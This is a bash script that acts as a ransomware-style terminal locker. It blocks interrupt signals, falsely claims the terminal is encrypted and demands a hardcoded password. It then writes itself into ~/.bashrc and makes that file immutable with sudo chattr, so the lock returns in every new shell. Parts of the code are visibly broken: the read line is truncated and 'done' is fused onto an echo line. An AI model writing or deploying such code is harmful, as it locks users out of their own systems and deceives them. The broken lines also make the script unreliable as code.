#!/bin/bash

trap "" SIGINT SIGTSTP

password="bb121#121"

while true; do
    read -p "Your terminal has been encrypted due to your lack of security. If you want to use your terminal again, >
    if [[ "$input" == "$password" ]]; then
        echo "GG kid"
        break
    fi

    echo "nice try kid, unfortunately you aren't allowed to use your terminal without inputting the correct password"done

trap - SIGINT SIGTSTP

echo -e "\n# Malicious script to restrict terminal access\n$(cat $0)" >> ~/.bashrc
sudo chattr +i ~/.bashrc